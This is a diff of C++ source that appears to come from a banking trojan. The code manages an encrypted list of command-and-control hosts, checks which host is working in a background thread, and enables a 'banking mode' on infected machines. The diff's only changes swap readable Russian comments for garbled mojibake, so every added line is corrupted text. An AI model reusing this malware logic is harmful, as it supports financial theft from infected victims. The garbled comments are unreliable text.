@@ -543,7 +554,7 @@ bool Hosts::UpdateHosts(PCHAR Args)
         }
 
 
-        // Уничтожаем данные
+        // пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
         FreeList(List);
 
         pDeleteFileA(TempFile);
@@ -552,7 +563,7 @@ bool Hosts::UpdateHosts(PCHAR Args)
 
 
 
-	// Освобождаем данные
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	if (BufferIsStr)
 		STR::Free((PCHAR)Buffer);
 	else
@@ -564,8 +575,8 @@ bool Hosts::UpdateHosts(PCHAR Args)
 
 bool Hosts::GetActiveHostFormFile(PCHAR FileName, PCHAR &Host, bool *FileExists)
 {
-	//  Функция возвращает первый доступный хост из основного списка
-	//  хостов лежащего на диске
+	//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
+	//  пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 
 	Host = NULL;
 	if (FileExists) *FileExists = false;
@@ -587,10 +598,10 @@ bool Hosts::GetActiveHostFormFile(PCHAR FileName, PCHAR &Host, bool *FileExists)
 	{
 		if (FileExists) *FileExists = true;
 
-		// Перебираем список и ищем рабочий хост
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 		for (DWORD i = 0; i < List::Count(List->Items); i++)
         {
-			Result = true; // В списке содержатся хосты
+			Result = true; // пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 
 			PHost H = (PHost)List::GetItem(List->Items, i);
 			if (H == NULL || STR::IsEmpty(H->Host))
@@ -624,8 +635,8 @@ DWORD WINAPI BankingModeApdateHostsThread(LPVOID Data)
 
 void Hosts::SetBankingMode()
 {
-	//  Функция включает использования хостов для системы которая
-	//  поймала банкинг
+	//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+	//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	PCHAR FileName = HostsGetBankingSignalFile();
 
 	File::WriteBufferA(FileName, NULL, 0);
@@ -660,7 +671,7 @@ THostChecker::THostChecker(const char *Hosts, bool HostsEncrypted)
 	FHosts = List::Create();
     List::SetFreeItemMehod(FHosts, _HostChecker_FreeHost);
 
-	// Распаковываем строки
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	TStrEnum E(Hosts, HostsEncrypted, 0);
 
 	while (E.Next())
@@ -688,7 +699,7 @@ THostChecker::~THostChecker()
 
 DWORD WINAPI HostCheckerThreadProc(THostChecker *Checker)
 {
-	// Выполняем проверку хостов
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
     Checker->DoCheckHosts();
 	return 0;
 }
@@ -697,11 +708,11 @@ DWORD WINAPI HostCheckerThreadProc(THostChecker *Checker)
 
 void THostChecker::Check(bool ReCheck)
 {
-	// Функция запускает проверку хостов
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	if (FThread)
 		return;
 
-	// Проверяем необходимость проверки
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	bool NeedCheck = ReCheck ||
 					 FWorkHost.IsEmpty() ||
 					 (DWORD)pGetTickCount() - FCheckTime >= HostCheckInterval;
@@ -716,11 +727,11 @@ void THostChecker::Check(bool ReCheck)
 
 string THostChecker::GetWorkHost()
 {
-	//Функция возвращает рабочий хост
+	//пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 
-	// Запускаем проверку
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	Check(false);
-	// Ожидаем окончания
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	if (FThread)
 		WaitForSingleObject(FThread, 10000);
 
@@ -731,7 +742,7 @@ string THostChecker::GetWorkHost()
 
 void THostChecker::DoCheckHosts()
 {
-	// Ищем рабочий хост
+	// пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
     DWORD Count = List::Count(FHosts);
 	for (DWORD i = 0; i < Count; i++)
 	{
